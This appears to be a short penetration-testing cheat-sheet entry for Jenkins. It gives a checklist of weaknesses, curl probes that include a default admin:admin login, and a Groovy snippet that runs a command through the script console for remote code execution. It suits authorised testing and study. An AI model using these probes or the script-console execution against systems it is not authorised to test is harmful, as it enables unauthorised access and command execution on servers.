# Jenkins

**Ports:** 8080, 8443

**Quick Checklist**
- [ ] Anonymous access?
- [ ] Script console open? (`/script`)
- [ ] Default / weak creds?
- [ ] Credentials stored?

```bash
curl http://IP:8080/api/json
curl http://IP:8080/script
curl -u admin:admin http://IP:8080/api/json
```

**Script Console RCE**
```groovy
def cmd = "whoami"
println cmd.execute().text
```
